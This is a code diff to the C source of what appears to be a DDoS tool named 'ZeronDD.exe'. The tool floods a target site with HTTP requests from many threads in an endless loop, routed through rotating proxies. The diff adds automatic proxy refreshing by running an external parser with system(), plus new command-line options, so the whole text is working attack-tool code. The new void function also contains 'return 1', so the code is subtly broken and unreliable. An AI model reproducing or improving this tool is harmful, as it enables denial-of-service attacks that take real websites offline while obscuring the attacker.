@@ -2,16 +2,20 @@
 #include <stdlib.h>
 #include <stdbool.h>
 #include <string.h>
+#include <time.h>
 #include "proxy.h"
 #include "http.h"
 
 static int 				thread_proxy_index = 0;
-static Proxy 			*proxy_list;
+static Proxy 			*proxy_list = NULL;
 static int 				proxy_list_size = 0;
-static unsigned char 	*proxy_failed;
+static unsigned char 	*proxy_failed = NULL;
 static char 			*fixed_target_site = NULL;
+static time_t 			time_now;
+static unsigned int 	update_proxy_interval = 20;
 
 void *task(void *userdata);
+void _PrepareProxies(void);
 
 #ifdef _WIN32
 	#include <windows.h>
@@ -28,9 +32,12 @@ void *task(void *userdata);
 		{ CODE }														\
 		ReleaseMutex(mutex);											
 
-	static void threads_func(unsigned int 	threads_count, 
-							 Proxy 			*proxy_list, 
-							 unsigned int 	proxy_list_size)
+	static int run_proxy_parser(void)
+	{
+		return system("proxy_parser_new.exe");
+	}
+
+	static void threads_func(unsigned int threads_count)
 	{
 		int i;
 		HANDLE *threads_list;
@@ -82,9 +89,12 @@ void *task(void *userdata);
 		pthread_mutex_unlock(&mutex);
 
 
-	static void threads_func(unsigned int 	threads_count, 
-							 Proxy 			*proxy_list, 
-							 unsigned int 	proxy_list_size)
+	static int run_proxy_parser(void)
+	{
+		return system("./proxy_parser_new");
+	}
+
+	static void threads_func(unsigned int threads_count)
 	{
 		int i;
 		pthread_t threads_list[threads_count];
@@ -126,6 +136,15 @@ void *task(void *userdata)
 	while (1)
 	{
 		MUTEX(
+			if ((time(0) - time_now) > update_proxy_interval)
+			{
+				time_now = time(0);
+				thread_proxy_index = 0;
+				_PrepareProxies();
+			}
+		)
+
+		MUTEX(
 			if (thread_proxy_index >= proxy_list_size)
 			{
 				thread_proxy_index = 0;
@@ -155,7 +174,6 @@ void *task(void *userdata)
 				if (proxy_failed[proxy_index] > 0)
 					proxy_failed[proxy_index]--;
 			)
-			 printf("[%s][%d] SUCCESS\n", target, proxy_index);
 		}
 
 		usleep(20);
@@ -165,38 +183,60 @@ void *task(void *userdata)
 	return NULL;
 }
 
-int main(int argc, char **argv)
+static const char *proxies_file_path = "proxies.txt";
+static void _PrepareProxies(void)
 {
-	int i;
-	unsigned int threads_count;
-	char *proxies_file_path = NULL;
+	int process_status;
 
 
-	if (argc < 3)
+	if (proxy_list != NULL)
 	{
-		printf("Usage: ZeronDD.exe [threads_count] [path_to_proxies] [optional][fixed_target]\n");
-		return 0;
+		free(proxy_list);
+	}
+	if (proxy_failed != NULL)
+	{
+		free(proxy_failed);
 	}
 
-	threads_count = atoi(argv[1]);
-	proxies_file_path = argv[2];
-
-	if (argc > 3)
-	{
-		fixed_target_site = argv[3];
-	}
-
-	HTTP_ModuleInit();
-
+	printf("Loading new proxies\n");
+	process_status = run_proxy_parser();
+	printf("Process status: %d\n", process_status);
 	if (!Proxy_Load(proxies_file_path, &proxy_list, &proxy_list_size))
 	{
 		printf("Proxy_Load error\n");
 		return 1;
 	}
-	printf("Read %d proxy\n", proxy_list_size);
+	printf("Load %d proxies\n", proxy_list_size);
 	proxy_failed = calloc(proxy_list_size, sizeof(*proxy_failed));
+}
 
-	threads_func(threads_count, proxy_list, proxy_list_size);
+int main(int argc, char **argv)
+{
+	int i;
+	unsigned int threads_count;
+
+
+	if (argc < 2)
+	{
+		printf("Usage: ZeronDD.exe [threads_count] [optional][update_proxy_interval] [optional][fixed_target] \n");
+		return 0;
+	}
+
+	threads_count = atoi(argv[1]);
+	if (argc > 2)
+	{
+		update_proxy_interval = atoi(argv[2]);
+
+		if (argc > 3)
+		{
+			fixed_target_site = argv[3];
+		}
+	}
+
+	time_now = time(0);
+	HTTP_ModuleInit();
+	_PrepareProxies();
+	threads_func(threads_count);
 
 	free(proxy_failed);
 	free(proxy_list);
